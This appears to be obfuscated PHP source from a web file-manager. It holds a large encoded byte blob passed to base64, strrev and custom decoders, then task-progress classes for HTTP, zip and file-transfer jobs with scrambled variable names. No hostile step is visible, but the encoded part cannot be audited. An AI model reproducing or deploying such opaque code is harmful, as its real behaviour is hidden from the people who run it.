246\232\14\144\70\65\34\5\111\124\235\44\161\256\253\275\170\250\275\210\71\300\370\217\26\225\155\110\376\261\345"."\54\316\127\52\334\157\127\270\107\201\24\301\223\353\225\37\305\30\106\234\34\116\306\356\361\275\170\176\275\106\152\254\24\261\250\53\66\65\11\250\122\51\113\127\311\110\271\77"."\111\156\301\275\245\22\373\140\305\112\145\76\223\145\40\235\10\361\372\144\67\353\370\4\356\345\102\177\267\27\167\301\233\153\345\56\347\321\342\125\32\46\67\116\75\25\375\17".base64_decode('5JFd4pcKTE0XBZlL+pP8aUYHxLMVrG94wiUf/g6wGEa+whkBceQTrXU8iAIdpedC').base64_decode('6a0BIqqlKwmrtqj8RYYKlBQx+WzDgG1X8tfJJ6SfBYo8vyaWSF92QPSkD2skA4YP')."\xa0\x86\x9a\x82\xbd\x22\x5b\xae\x2c\x7\xcd\x94\xf2\x3\x4d\x52\xa2\x62\x9b\xa6\x92\xd3\xf2\x23\xc0\xb5\x4e\xb0\x1a\x27\x58\x33\xf1\x87\x9a\xb0\x2e\xb6\x85\x22\x40\xaf\xb9\x83\x56\xbc\x8f\x8".base64_decode('b3XU1wqkUMG0Dz+k4sObVKwEuTqzJf7URYGEoYWd4a55oYikgSMB1JbWiBro7KyY')."\260\212\61\54\130\42\205\257\257\175\313\231\124\77\311\260\152\226\221\353\127\222\130\241\277\251\12\103\253\24\253\230\144\156\152\253\374\100\107\111\6\301\347\317\62\240\110\65"."\56\242\244\21\232\170\111\210\46\127\317\236\345\67\146\363\301\26\236\155\212\246\260\127\360\371\117\306\134\277\37\353\270\344\117\301\263\53\137\271\23\150\233\360\143\243\50\263".base64_decode('NIWOY1M1EbxWKxm0H3MFv9nuwhF27zHLr8mJeGXFTMb+cmZ/kPtwqyg7D0hOrckj')."\26\55\132\176\121\171\21\134\271\57\51\47\321\231\44\26\25\345\371\375\344\204\351\27\347\32\347\345\2\227\305\127\100\212\202\226\34\300\170\44\210\76\174\11\22\72\361\101"."\x84\x26\x38\x5c\xf4\xdb\x92\x66\x41\x9\xdb\x14\x11\x59\x6e\x51\x3c\x18\xb3\x72\x25\xad\x8\xef\xf3\xab\x57\x97\xc3\x40\x39\xd1\x9d\x14\x28\x18\x6e\x10\xc6\x17\x37\xc\x1f\x8\x5\xc\xed\x5e"."\316\317\120\134\225\63\11\10\313\103\177\105\231\160\144\236\210\320\203\210\43\261\233\351\1\223\130\117\167\265\157\342\352\325\176\203\251\360\60\165\3\126\326\307\163\323\170\217".strrev('£é6ıF~±,½7æîÍ54ïëUqAØQ?Ô;’Ãçå\';€g†õ™Ï')."\x6f\x62\x31\xf\xb6\x44\x4\x73\xcb\x51\x9b\x52\x11\x1f\x39\xcc\x7\x9c\x5e\x62\xe7\xc\xf2\xa7\x50\xe8\xa8\xca\xe1\x40\xa1\x20\x47\xfd\x2c\x82\xc5\xd8\x59\xa3\xcf\xcf\xd7\x38\x15\x6d\xfb\x92"."\xc2\x7c\x88\x65\x21\x14\xc6\x5\xc7\x7a\x36\xae\x4\xec\xba\x99\x80\x7\x11\x9\x44\xbc\xd6\x72\x37\x1c\xd5\xc5\x81\x3c\x30\xcb\x4a\x16\x8d\x82\xed\xa0\x4e\xf4\xf5\xc3\x2a\xf2\x54\xcd\x72\x6d"."\120\243\131\252\24\70\205\67\125\21\17\356\125\210\32\321\24\40\3\242\51\263\60\331\121\212\172\266\251\212\64\327\312\350\72\52\117\10\113\245\217\240\202\125\12\243\211\71"."\215\217\130\321\66\321\166\307\315\123\340\341\250\256\30\150\360\7\42\160\165\160\362\351\364\167\374\311\14\103\310\363\145\131\275\110\365\223\11\221\41\227\126\151\41\152\201\7".base64_decode('rDpj0US0hb33U0kmwy3nLWpyJY41zMqEX+OzHJwB8AME5r1Yyue5RhTmCPkuhTUs')."\xd4\xf9\xf1\x68\x84\x3d\x9b\x91\xe0\x68\x83\xbd\x6b\xfb\x94\x6e\x8d\x5d\x72\x80\x2a\x25\x31\x68\x69\x9\x87\x82\x91\x84\x1a\x82\x8d\xaa\xbe\x61\xba\xaf\x4e\x58\x99\xd0\x8b\x9d\x78\xa6\x64\x8b".base64_decode('TRO7i09gk1QLwJJ/OuwdD32rmxrGNtUxewOmiyXMkyBnhTqoxDHBdZ30vEMoQr+d')."\65\231\313\276\206\272\272\72\157\135\75\372\237\151\353\62\107\141\215\314\214\132\312\122\127\327\110\376\247\11\104\20\10\363\346\114\101\364\201\21\66\146\135\256\353\320\40\146"."\xce\x6f\xe4\x4b\x8c\xcf\xea\x6e\xc1\x66\x47\xa\x6e\x5a\x2f\x63\x2d\x58\xfb\xd1\x94\x11\x4f\x7a\x8c\xc6\xcc\x94\x4e\x87\x33\x15\x72\xe1\x5\x31\xdd\x3d\x8\xfc\x26\x11\x90\x40\x76\xb3\xcc\xc2".base64_decode('iN1BCEEGBdrLbdpQNoFqM6kJYRNvVDCf6pY/5mODS4HCNbCXJXjltwagEN09hMTc')."\321\64\124\306\351\242\17\103\320\336\235\344\375\304\0\111\210\202\171\67\311\355\40\216\312\202\161\222\314\15\303\110\54\313\355\325\161\64\302\153\242\117\132\120\337\362\60\206"."\25\320\65\143\16\251\142\243\306\321\371\74\106\206\24\237\242\30\32\246\44\343\75\74\256\214\144\113\331\271\340\111\134\167\303\355\75\61\342\36\60\262\16\323\125\125\52\52"."\x8f\xed\x4c\x9c\x91\xf5\x24\xe1\x2c\x89\x2b\x42\x8b\x3e\xc0\x1f\xf6\xa0\xda\x74\xac\x6d\xa\x2c\x3d\x1a\x25\x8e\x82\xc9\xe3\x7b\x54\x1\xb2\xf1\xd0\xb2\xc9\xb5\xdd\x13\x4b\xe6\xa8\x68\xa\x3b".strrev('nWpÆä+ÕÈ›^'."\0".'eÄe@&UÉ;TŸ?Ü- A Âf ßã{	Šf“2Ô').base64_decode('4pmvhTscld310dtrSWPCAofp4rqa1TEoHbB8haLZj2bdkgcNwTsrg3n28pwVMvHW')."\xcb\xf9\x64\x20\x16\xda\xb3\x27\x30\x1\x9d\x85\x2d\xac\x26\x5e\xe0\x95\xb2\x8a\x97\x1f\x24\xa0\x73\x35\x4b\x9\x2d\xfc\xfd\x1d\x19\x88\xf\x6c\xb2\x82\x2\x51\x2b\x75\xd6\x81\x4f\x82\x4e\x8"."\x6f\xd9\xd7\x20\x1d\x3b\xc1\xdb\xf0\x5c\xaa\xac\x54\x47\xb3\x9\x8a\x84\xa5\x2b\xb2\xc\x58\x75\xa0\x9\xc3\x55\xa6\xf\x81\x47\x48\x5c\x43\x3a\xe1\x14\x46\xcf\xd8\x8e\x9b\x90\x4\x21\x74\x59".base64_decode('nb3eCqSQLCpcAdEbcQ2qWAiwdJua5GLOtDd/chEL/IzlwsPKRYSy7BwPqSqLP/CK')."\156\347\217\206\126\100\104\47\262\225\141\25\141\41\160\5\215\234\24\112\61\134\73\20\62\17\72\7\132\124\122\347\301\140\205\276\244\251\344\165\156\201\354\234\124\271\0\274"._kodDe('LVRzhxMs/IXs0vyrqxVNclsTdKfjhGcjtx2Oc1byoLblIRfioA+FLHwwN6xlZgwInA==').base64_decode('8f1iN4EJ6abUmNWJmwyhFJufFSWdMfOKc6OVtg1FqhOoeCJTNG1+7sPpCC1FJCwz')."\170\11\132\304\73\133\174\326\161\43\46\71\120\346\131\321\66\317\276\256\261\26\21\75\47\342\200\132\72\212\272\242\156\255\60\262\115\333\154\247\145\36\251\205\302\24\236\325".base64_decode('uKRGU+ELUIgXAf6hqCfNIpFESH4L8nZM75ejYZNLYPDNll6hCuwqRlr1eBEEknZJ').base64_decode('djwjOa5GMclDucQHeusVzkCqtGYamSQlkPyVeEmXHFAyUiCij3ipj1/HuDg8Zveg')."\xc8\xc\x14\x33\x64\xc0\x15\x10\x1f\x20\xb8\x7\x96\x9c\x86\xaa\xc5\xe\x64\x45\xcf\xe4\x22\xe4\x9b\x65\x45\x68\x1a\xe6\x61\x84\x27\xd\x39\xc5\xc2\xae\xc7\xbb\xd8\xb4\x55\x4a\xa9\xf0\x29\x92"."\44\215\150\222\373\26\202\321\21\203\4\11\43\72\323\34\364\326\67\170\231\343\44\331\50\202\35\42\200\214\243\265\40\241\1\76\222\61\52\2\172\167\220\117\344\61\245\113"."\x2d\xe2\x5d\x43\xf8\x14\x20\x8e\x44\xf8\x7c\x12\x8f\x23\x3c\x56\x94\xb6\x72\x9d\xeb\xe4\x11\xd7\x1b\x32\x55\x15\x77\xe4\x54\x55\xf\x67\xe8\xaa\x94\x4e\x47\x8\x27\xb7\x3a\x94\x2b\x5d\x19\xd0"."\xca\x70\xa6\x83\xf\x72\xd1\x18\xea\xfd\xc3\x74\x68\xbe\xb8\x2a\x1\x4f\xf7\xb2\x97\x75\x52\x4a\xf4\x43\x68\x98\x22\x90\x49\x3d\x9d\x4b\x3\x23\xee\xfa\xa9\x53\x12\xa6\x2a\xcb\xe9\x92\x0\x27"."\114\16\54\327\27\300\130\11\125\122\163\121\170\235\262\246\26\233\213\72\44\137\35\43\334\250\17\153\337\340\75\222\253\124\132\162\204\245\162\344\264\34\21\252\155\344\50\315"."\x41\x3c\xd7\x90\xce\x2c\x3f\x99\x84\xa6\xb3\xbd\xd3\xcf\x41\xcd\x7c\x79\xd2\xc3\xbd\xf0\x85\xd4\xc2\x54\x7a\xf4\x61\x1d\xce\x57\x43\x39\x23\xa9\x84\xa3\xf3\x42\x2d\x81\x70\x6b\x28\xbe\x40\xe9"."\xd7\x6d\x45\x28\x36\x90\x97\xa\x9c\x4b\x99\x88\x21\xe9\xc0\x33\xac\xee\xe3\x4e\xf3\x71\xd0\xdb\x87\x18\x76\x6f\x8a\x1f\x6a\x2c\x71\x7c\x91\x74\xae\xa4\xf7\x86\x9c\xd5\x52\xfc\xd3\x8b\x65\x35".base64_decode('5rFBR7asDBauVsidFVJHKXOhqJfnH9Gxco3UYqlAqUJrIH/lL5CXDeTciA/R82M1')."\336\310\17\32\226\41\26\76\53\61\42\327\36\150\355\10\105\324\100\70\34\135\354\320\115\23\142\345\42\177\107\42\45\77\73\41\315\214\230\4\372\365\162\27\135\340\340\110".base64_decode('9vDtkmLQ6ZO9tRXYJQk87ce90NOo9CpMoagZli4B6GsmE8F+QstmHQ/WZdNStOTc')."\131\53\176\112\245\37\140\60\311\63\134\245\14\61\374\344\374\377\270\251\106\112\170\145\62\122\114\127\203\233\273\121\7\365\55\362\343\206\354\233\145\57\337\174\343\33\72\36"."\161\255\244\22\277\65\354\51\57\223\234\106\200\125\246\260\120\124\245\257\317\211\117\240\163\162\161\244\40\337\353\371\123\176\76\304\64\200\235\317\5\331\145\22\216\210\163\1".base64_decode('zg614c/R0yI6BGOZFztBMF1DRCdgnB332q7XgNxqmY6H4Mu+QVzR07Ru3B2Us1d0').base64_decode('DsX4UxOiqDulQgNQsiJESjyD0qTU0Yep+DMCyixmvCs+QNxFBXMF23GSbpcVs6W5').strrev('4[ùvë®ÄìG/>ËXÈ!)´ù'."\n".'#ğéUÅÚÌ)‡'."\0".'e#s28Ö“ˆéÂ'."\0".'¡').strrev('O!g ùSÑiIã°ıÄ0æ7ÎC˜ÉÙŸ…ÛêŞåo)+:|—šAIÿø´').base64_decode('2WMWCnndVEGoDrOIHROxIyHJLH16Av3pgV+2nbkbQQkVfLKWI1VLxsimilyFRgA6')."\164\161\116\47\245\260\26\211\306\136\161\45\57\156\265\62\232\14\357\147\124\172\155\11\273\176\163\76\3\42\136\127\21\173\247\363\265\11\176\21\154\211\305\140\331\216\367\115"."\x12\x66\x42\xeb\xf7\x50\x8e\xc\x53\x35\x11\x6b\x1e\x91\xc3\xb2\x7a\x27\xe9\x5\x4a\x64\xb2\xb4\x14\x9f\xef\xd9\x52\x6\xf6\x64\x59\xca\x43\x1e\xd7\xa2\xa4\xce\xfd\x40\x87\xb4\xd2\x38\xfd\x94".base64_decode('S/dnzT4tG6OaZw6bjCI6TfGn6h3ZKMivFQriykreMtFfhy0cpHUl2lVi0a3Sm+24')."\xc0\x39\xe9\xb2\x8b\x2\xe1\xe2\xab\x94\xf\xd1\x4b\x0\x7\xb4\x28\x9d\xf3\x64\x6f\x9a\xf4\x8a\x4f\x58\x5f\x41\x76\xd4\xce\x4e\x7a\xa7\x7\x3\x26\x57\xc9\xee\x59\xb9\x44\xba\x4d\x7a\xed\xdb"."\x5f\x7e\x2f\x8b\x75\xea\x80\xa2\xc8\xef\xc6\xc3\xc5\xb8\x4f\x3e\x88\x41\x6\x65\x96\x22\x50\xc3\xb1\x90\x31\x2a\x21\x6e\x98\x3e\x5f\x46\x28\x85\xcc\xb8\x7f\xd\x54\x7a\x3c\x6\x9e\x49\xab\xf4"."\26\14\305\174\362\323\252\247\371\241\6\307\305\346\56\173\245\20\112\31\356\27\314\312\137\143\143\57\257\261\245\3\317\256\125\170\113\155\314\247\330\74\302\320\356\353\236\230"."\21\346\140\316\307\201\161\77\70\153\300\317\15\145\107\17\367\251\203\17\253\253\100\314\75\310\11\263\134\74\53\156\256\35\17\305\111\275\6\322\126\376\330\234\64\14\122\277"."\x4b\xc5\xac\x87\x5c\xe2\x7b\x98\x57\xb7\x8a\xef\xd5\x39\x1e\xbc\x71\x4f\x68\x85\x17\xef\xbe\xb1\x42\x50\xf8\x25\x87\xae\x94\x93\xea\x35\xce\xea\x2b\xb2\x5b\x51\x77\x36\xc3\x81\xbb\x6a\x51\x17"."\326\42\324\153\146\331\6\261\64\227\152\230\74\365\124\131\270\41\246\120\334\17\62\147\334\364\7\270\25\201\24\212\23\15\25\346\252\123\136\375\44\321\251\203\135\376\36\242"."\153\7\370\237\55\30\161\172\240\131\45\315\350\362\167\145\313\106\200\340\251\244\63\44\155\210\56\5\21\23\153\160\130\142\325\321\55\120\74\211\350\374\26\145\37\52\364\103"."\xda\xf7\xc4\x62\xa1\x4f\xda\x99\x59\x7c\xc6\xce\x61\xd1\xb9\x5d\xd4\x9c\x7\xca\x4a\xe7\x26\x32\x12\xec\x90\x66\x90\xc7\xac\x75\x77\xdb\xc9\xc0\x80\x34\x45\x24\x4b\x7\x2b\xb9\x46\xdb\x74\x8b"."\x82\x70\x71\xbc\x2f\x12\x49\x64\x34\x9f\x85\x6d\x1b\x9b\x16\x8b\xd5\x26\x51\xa2\xff\xc1\x4\xb2\x33\x12\x3d\x4e\x9\xf5\xa0\xa\x3d\xf7\xcf\x65\xa4\xa5\xc2\x93\x85\x92\xb6\xc5\xd7\xb4\x9b\x72".base64_decode('d/w86NVsr4SQkvhQt6NkgoFEiGOrs6+u6lExUUevRxkrUzmLJ71sKJxPScwdLs3s')."\15\307\70\365\23\163\67\47\233\44\277\273\106\254\306\204\257\5\262\134\35\113\127\362\206\53\33\136\221\212\344\65\121\136\265\364\212\235\220\12\21\61\22\364\10\26\64\321".base64_decode('RyDNDMzjlnqapN/lFFXhoZZeKDXlsJgCTPajzMco+rrjqInira4HawmJcr9iy4aI').base64_decode('0AVB8iSDT8e5hr/r5TjnWO7H/BC3J/sJRlH3Y6hAG4kiPf2atLuKjVSEIqWciEjy')."\135\162\244\342\211\16\273\130\354\121\311\105\6\230\265\255\345\172\344\223\172\160\245\141\306\371\377\137\277\143\367\377\352\371\272\251\165\114\22\357\170\3\167\36\360\337\214\345".strrev('”ƒøù¢ëÙKålûJÍ–”eØÒÛ9‹UæamsŠYá`tÎ«°)SD¼•')."\225\42\156\353\61\367\113\243\335\354\25\156\362\210\150\157\245\214\202\14\361\203\121\5\74\246\40\306\17\347\313\357\216\361\174\205\235\76\226\45\216\243\54\233\370\52\142\114".base64_decode('mIMyPwsl8RmQeA2A8ZLNPKMFdlqsBTLfO5eRI2JNDlRJpkQOUBn9SjhmwQGUBxhm')."\xd\x5b\xc9\x3a\xdf\x6c\x87\x12\x1d\xae\x97\x12\x69\x26\x4b\x1e\x4d\xa7\xa5\xaa\xa4\xe0\x57\xae\x56\x50\x5e\x13\xa7\x2\x72\x11\xac\xa2\xed\x14\x67\xf1\xb7\xaf\xeb\xdc\x8f\x61\xd7\x7b\xcb\x3f"."\106\55\44\260\104\45\206\145\30\114\52\105\256\167\310\65\153\205\62\24\153\343\42\317\30\353\246\362\352\345\257\125\12\21\35\16\311\375\145\124\240\263\150\22\116\317\11\345"."\162\35\111\117\126\172\276\171\202\257\154\257\141\224\317\61\374\350\20\47\356\17\15\223\70\135\147\105\273\72\152\210\261\17\140\57\72\127\264\231\2\17\244\207\222\361\372\22"."\x8e\x11\xb1\x1b\x2b\x22\x4a\x94\xb7\x73\x66\x7f\x27\xa9\xaf\x3\xc8\x21\xf0\xb3\xe4\xf7\x2d\x9c\x25\xb1\x41\x82\x73\x5d\xcd\xae\x94\x2d\x69\x16\x2d\x29\x1b\x87\x57\xca\x8b\x31\x4c\x16\x68\xc8"."\151\370\51\133\333\61\27\302\177\276\333\157\76\71\346\323\223\273\343\0\17\127\274\62\110\272\1\105\134\170\312\371\20\7\111\44\140\346\103\23\152\220\356\360\234\127\250\334"."\133\170\31\325\54\31\141\51\231\224\142\256\331\320\57\266\121\14\11\317\13\44\231\336\116\4\244\367\222\335\245\234\117\153\113\27\256\111\202\171\301\362\73\65\161\325\47\361"."\x1c\xac\x18\x3e\x22\x89\xed\xc0\x5\xaf\xf4\x52\x74\x5a\x1b\x14\xc\x93\x60\xd2\x53\x29\xfe\x48\xbb\x23\x6b\x4a\x77\x3b\x99\x41\x10\xf1\x9e\x3b\x66\xb8\x24\xf3\x5c\xa1\x4d\xaf\xf\xb9\x1f\xcc"."\xf5\xc9\x26\xbd\x8e\x8c\xe5\x50\x61\xbe\x2b\x95\x17\xb7\x2b\xa2\x9b\x18\x56\xa9\xfb\x64\xa1\x39\x8b\xcb\xe6\xc1\x1c\xa9\x4\x88\x3e\xa5\xc0\xb5\xb3\xa4\x3\x11\xb6\xa\x11\x6a\x5b\xb4\x2b\xfc".base64_decode('3C8+6TRG5tn4nKE8xAbH64C6jnhYxMK4B1eSJT9267xHlQUREgro2bBUnXzHOmaB').base64_decode('eOWPCKx0DrFkxS0S2LZnOgZfIpG8Y5AzJic6muOeWnI6EehLgTki36VpAWcSza+7').base64_decode('Wi8XcPeMlrCGDDuZkY5M5Ynl8GLZoMKHKrfX3So2pu6DpKikrD2SokbCrFCGtqhi')."\61\232\204\113\12\326\325\121\166\214\41\300\145\151\22\56\133\226\314\12\113\162\27\251\234\255\225\254\61\272\127\76\170\40\214\110\125\350\260\353\310\116\263\216\65\236\25\63"."\227\177\16\60\316\235\233\110\57\52\267\102\10\35\134\27\346\225\132\121\61\363\230\255\20\271\135\273\100\45\132\313\122\306\64\54\32\123\211\104\50\126\224\223\171\221\126\101".base64_decode('zYN+Em/hsuemCsmyzkhlrZJYRcpgOdU9XHB53MDxJzBfgIzoUJk1BoQGHFNmn+Ag')."\377\245\374\100\336\344\133\112\112\50\53\142\105\353\100\321\75\316\145\265\71\321\70\137\222\174\251\126\324\255\367\140\21\100\371\141\73\253\261\33\3\311\50\201\236\216\114\304"."\326\353\116\207\255\262\3\47\232\316\76\222\225\144\212\56\161\236\20\110\70\324\21\52\10\274\10\10\330\76\41\131\247\365\111\14\215\300\11\207\275\10\145\43\340\102\202\336"."\145\266\340\73\163\176\213\105\234\215\322\155\227\46\307\315\242\355\301\151\11\263\100\176\233\115\333\26\167\373\124\2\100\170\105\274\167\172\44\325\25\24\22\127\126\270\121\344"."\56\204\240\55\241\76\44\10\267\252\370\150\35\327\151\52\241\131\216\10\276\143\341\21\171\153\204\333\325\266\222\353\376\127\0\320\71\266\317\34\146\256\34\261\331\271\150\217"."\xb8\x85\x21\x43\x26\xd8\x17\x40\x3f\x59\xf9\x86\x18\xf4\x5b\x7e\x9a\xe2\x87\x27\x0\xbc\x1a\xe6\x23\xe1\xf5\x2f\xdf\xf2\x42\xbf\xa3\x38\x7d\x43\x89\xeb\xa8\x7e\x5d\xd\x20\x7d\x15\x55\x50\xff"."\337\104\54\6\206\75\361\104\274\54\251\63\20\217\57\216\306\132\251\273\360\262\144\122\112\122\146\52\113\352\154\217\106\306\112\13\166\4\102\341\262\64\254\367\24\121\205\317"."\55\232\24\352\44\255\44\227\207\143\265\42\324\262\100\264\204\134\123\13\241\176\41\143\62\131\75\273\364\210\153\131\166\240\227\254\124\365\234\160\266\46\312\344\215\344\200\220"."\x3\x6a\x12\x6f\x6f\x31\xaf\x88\x3c\xe0\x7c\x7b\xc7\xa5\x5e\xc8\x90\x14\x2a\xc2\x3a\x4b\x11\xa8\x3b\x56\x0\x28\x76\x9f\xce\xd7\x3a\xe7\xb3\xc5\xbd\xbb\xcf\x71\x3f\x2f\xc1\xc9\x7a\x20\x4\x46".base64_decode('wjl5HyaAiRUHSBYIl19QkFQxALhh801QeFtu9kkXEPSUAzajMKSSXhoNO5Jtrb/i')."\x35\x35\x15\xfc\xe1\x15\x2f\x44\x72\xff\x1b\x56\xef\xa1\xdd\xfb\xab\x0\x0".strrev(''), 10, -8))); goto Câ¤îÖ¯µõ; Eò´‡¸¹‰¦: class TaskHttp extends Task { protected function startAfter() { $ú‰Á–­ =& $_SERVER[¡“ËÌ§œ]; $íî®Õû† =& $this->task; $íî®Õû†[$ú‰Á–­[1738]] = 1; Hook::bind($ú‰Á–­[1706], array($this, $ú‰Á–­[1739])); Hook::bind($ú‰Á–­[1708], array($this, $ú‰Á–­[1740])); Hook::bind($ú‰Á–­[1710], array($this, $ú‰Á–­[1741])); } protected function endAfter() { $ñ«„Ùñ‘ =& $_SERVER[¡“ËÌ§œ]; Hook::unbind($ñ«„Ùñ‘[1706], array($this, $ñ«„Ùñ‘[1739])); Hook::unbind($ñ«„Ùñ‘[1708], array($this, $ñ«„Ùñ‘[1740])); Hook::unbind($ñ«„Ùñ‘[1710], array($this, $ñ«„Ùñ‘[1741])); } public function progressStart($ÖæÆ¥¡) { $¡±Ìœîã =& $_SERVER[¡“ËÌ§œ]; $¹‘¨à¦« = curl_getinfo($ÖæÆ¥¡); self::log($¡±Ìœîã[1742] . $¹‘¨à¦«[$¡±Ìœîã[336]]); self::valueSet($this->task[$¡±Ìœîã[437]], $this->task); } public function progressEnd($¤µñòùà) { $“€úš˜” =& $_SERVER[¡“ËÌ§œ]; self::log($“€úš˜”[1743] . $this->task[$“€úš˜”[437]]); $this->end(); } public function progress($š¿îúéü, $‰…Øú—®, $ ªì²¥Ë, $£øûâíó, $¨À­Ş¤Ì) { $İÈ€’ıü =& $_SERVER[¡“ËÌ§œ]; $ Í³ï¦Ù =& $this->task; if ($¨À­Ş¤Ì > 0) { $ Í³ï¦Ù[$İÈ€’ıü[806]] = $ Í³ï¦Ù[$İÈ€’ıü[806]] == 0 ? $£øûâíó : $ Í³ï¦Ù[$İÈ€’ıü[806]]; $ Í³ï¦Ù[$İÈ€’ıü[1662]] = $¨À­Ş¤Ì; } else { if ($ ªì²¥Ë > 0) { $ Í³ï¦Ù[$İÈ€’ıü[806]] = $ Í³ï¦Ù[$İÈ€’ıü[806]] == 0 ? $‰…Øú—® : $ Í³ï¦Ù[$İÈ€’ıü[806]]; $ Í³ï¦Ù[$İÈ€’ıü[1662]] = $ ªì²¥Ë; } } $this->update(); self::log("\160\x72\157\147\162\145\x73\x73\110\164\x74\x70\72\x64\x6f\x77\156\x3a{$ ªì²¥Ë}\57{$‰…Øú—®}\73\40\165\x70\x6c\157\141\x64\72{$¨À­Ş¤Ì}\57{$£øûâíó}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‚®­¯¤à, $°§¯×Ñ‹ = '', $ÒœÒ‰ÖÚ = 0, $â¿‹¿ = '') { $…ÀÛ»»š =& $_SERVER[¡“ËÌ§œ]; $Ù¨ˆòš = new Task($‚®­¯¤à, $°§¯×Ñ‹, $ÒœÒ‰ÖÚ, $â¿‹¿); $GLOBALS[$…ÀÛ»»š[1744] . $‚®­¯¤à] = new TaskLog($…ÀÛ»»š[1645], $Ù¨ˆòš, $â¿‹¿); return $Ù¨ˆòš; } public function __construct($©††Ù¢¡ = '', $Ó«éæ¬© = '', $–å”ğõØ = '') { $¨ßµùÈš =& $_SERVER[¡“ËÌ§œ]; if (!$©††Ù¢¡) { $©††Ù¢¡ = $¨ßµùÈš[1645]; } $ØÅ£Íùò = $©††Ù¢¡ . $¨ßµùÈš[415] . rand_string(10); if (!$–å”ğõØ) { $–å”ğõØ = $©††Ù¢¡ . $¨ßµùÈš[53] . $–å”ğõØ; } switch ($©††Ù¢¡) { case $¨ßµùÈš[1645]: if (!$Ó«éæ¬© || !$Ó«éæ¬©->task) { return echoLog($©††Ù¢¡ . $¨ßµùÈš[1745]); } $Ø±õ º¦ = $Ó«éæ¬©; $ØÅ£Íùò = $Ø±õ º¦->task[$¨ßµùÈš[437]]; $©††Ù¢¡ = $Ø±õ º¦->task[$¨ßµùÈš[437]]; if (!$Ø±õ º¦->task[$¨ßµùÈš[1559]]) { $Ø±õ º¦->task[$¨ßµùÈš[1559]] = $–å”ğõØ ? $–å”ğõØ : $©††Ù¢¡; } break; case $¨ßµùÈš[1746]: if (!$Ó«éæ¬©) { return echoLog($©††Ù¢¡ . $¨ßµùÈš[1747]); } $£×ßˆæ© = is_string($Ó«éæ¬©) ? array($Ó«éæ¬©) : $Ó«éæ¬©; $Ø±õ º¦ = new TaskFileTransfer($ØÅ£Íùò, $©††Ù¢¡, 0, $–å”ğõØ ? $–å”ğõØ : $£×ßˆæ©[0]); foreach ($£×ßˆæ© as $±º…£Á) { $Ø±õ º¦->addPath($±º…£Á); } break; case $¨ßµùÈš[342]: if (!$Ó«éæ¬©) { return echoLog($©††Ù¢¡ . $¨ßµùÈš[1747]); } $£×ßˆæ© = is_string($Ó«éæ¬©) ? array($Ó«éæ¬©) : $Ó«éæ¬©; $Ø±õ º¦ = new TaskZip($ØÅ£Íùò, $©††Ù¢¡, 0, $–å”ğõØ ? $–å”ğõØ : $£×ßˆæ©[0]); foreach ($£×ßˆæ© as $±º…£Á) { $Ø±õ º¦->addPath($±º…£Á); } break; case $¨ßµùÈš[1234]: if (!$Ó«éæ¬©) { return echoLog($©††Ù¢¡ . $¨ßµùÈš[1747]); } $Ø±õ º¦ = new TaskUnZip($ØÅ£Íùò, $©††Ù¢¡, 0, $–å”ğõØ ? $–å”ğõØ : $Ó«éæ¬©); if ($Ó«éæ¬©) { $Ø±õ º¦->addFile($Ó«éæ¬©); } break; case $¨ßµùÈš[148]: $Ø±õ º¦ = new TaskHttp($ØÅ£Íùò, $©††Ù¢¡); break; default: return; break; } $this->task = $Ø±õ º¦; $this->taskID = $ØÅ£Íùò; Hook::bind($¨ßµùÈš[1682], array($this, $¨ßµùÈš[1748])); Hook::bind($¨ßµùÈš[1684], array($this, $¨ßµùÈš[1749])); Hook::bind($¨ßµùÈš[1678], array($this, $¨ßµùÈš[1750])); echoLog($¨ßµùÈš[1751] . $Ø±õ º¦->task[$¨ßµùÈš[1559]]); } public function __destruct() { $this->end(); } public function end($ÍÀÜ©Ç• = '') { $®„ƒ¦å¢ =& $_SERVER[¡“ËÌ§œ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÍÀÜ©Ç•); $this->task = !1; $this->taskID = !1; Hook::unbind($®„ƒ¦å¢[1682], array($this, $®„ƒ¦å¢[1748])); Hook::unbind($®„ƒ¦å¢[1684], array($this, $®„ƒ¦å¢[1749])); Hook::unbind($®„ƒ¦å¢[1678], array($this, $®„ƒ¦å¢[1750])); } public function taskUpdate($ÀãÑ•Ë±) { $¸‹è“ª =& $_SERVER[¡“ËÌ§œ]; if (!$ÀãÑ•Ë± || $this->taskID != $ÀãÑ•Ë±[$¸‹è“ª[437]]) { return; } $·”±¾ñó = 20; $íÇ”Ê = intval($ÀãÑ•Ë±[$¸‹è“ª[1663]] * $·”±¾ñó); $ÑÕ²ÃÊÉ = $¸‹è“ª[162] . str_repeat($¸‹è“ª[904], $íÇ”Ê) . $¸‹è“ª[1034] . str_repeat($¸‹è“ª[53], $·”±¾ñó - $íÇ”Ê) . $¸‹è“ª[164]; $™¸‰Ì„¦ = $ÑÕ²ÃÊÉ . sprintf($¸‹è“ª[1752], $ÀãÑ•Ë±[$¸‹è“ª[1663]] * 100) . $¸‹è“ª[1753]; $ŠğÒö½’ = $™¸‰Ì„¦ . $ÀãÑ•Ë±[$¸‹è“ª[1662]] . $¸‹è“ª[8] . $ÀãÑ•Ë±[$¸‹è“ª[806]] . LNG($¸‹è“ª[1754]); $Ä¥È¾ = $¸‹è“ª[12]; if ($ÀãÑ•Ë±[$¸‹è“ª[1738]]) { $ŠğÒö½’ = $™¸‰Ì„¦ . size_format($ÀãÑ•Ë±[$¸‹è“ª[1662]]) . $¸‹è“ª[8] . size_format($ÀãÑ•Ë±[$¸‹è“ª[806]]); $Ä¥È¾ = size_format($ÀãÑ•Ë±[$¸‹è“ª[1664]]) . $¸‹è“ª[1755]; } if ($ÀãÑ•Ë±[$¸‹è“ª[1084]]) { $ÀãÑ•Ë±[$¸‹è“ª[1712]] = $ÀãÑ•Ë±[$¸‹è“ª[1084]] . $¸‹è“ª[53] . $ÀãÑ•Ë±[$¸‹è“ª[1712]]; } if ($ÀãÑ•Ë±[$¸‹è“ª[1712]]) { $«·Æê = $¸‹è“ª[12]; if ($ÀãÑ•Ë±[$¸‹è“ª[1714]]) { $«·Æê = $¸‹è“ª[50] . size_format($ÀãÑ•Ë±[$¸‹è“ª[1715]]) . $¸‹è“ª[8] . size_format($ÀãÑ•Ë±[$¸‹è“ª[1714]]); } $Ä¥È¾ .= $ÀãÑ•Ë±[$¸‹è“ª[1712]] . $«·Æê; } if ($ÀãÑ•Ë±[$¸‹è“ª[783]] && !$ÀãÑ•Ë±[$¸‹è“ª[1714]]) { $Ä¥È¾ .= $¸‹è“ª[53] . 